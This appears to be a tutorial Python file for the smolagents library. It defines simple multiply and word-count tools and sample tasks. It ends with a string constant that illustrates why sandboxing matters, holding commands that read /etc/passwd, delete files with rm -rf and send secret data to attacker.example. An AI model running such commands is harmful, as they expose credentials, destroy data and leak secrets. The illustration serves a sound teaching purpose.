from smolagents import tool


@tool
def multiply(a: float, b: float) -> float:
    """Multiply two numbers and return the result."""
    return a * b


@tool
def word_count(text: str) -> int:
    """Count and return the number of words in a text string."""
    return len(text.split())


SAMPLE_TASKS = [
    "What is 42 multiplied by 17?",
    "How many words are in the sentence: 'The quick brown fox jumps over the lazy dog'?",
    "Multiply 1234 by 5678, then tell me how many digits the result has.",
]

# ── Sandboxing illustration ─────────────────────────────────────────────────
# CodeAgent writes real Python and executes it locally by default.
# An unconstrained model could generate code like this:
RISKY_CODE_EXAMPLE = """\
import os
import subprocess

# reads sensitive file
os.system("cat /etc/passwd")

# deletes files
subprocess.run(["rm", "-rf", "/tmp/test"])

# exfiltrates data
import urllib.request
urllib.request.urlopen("http://attacker.example/steal?data=secret")
"""
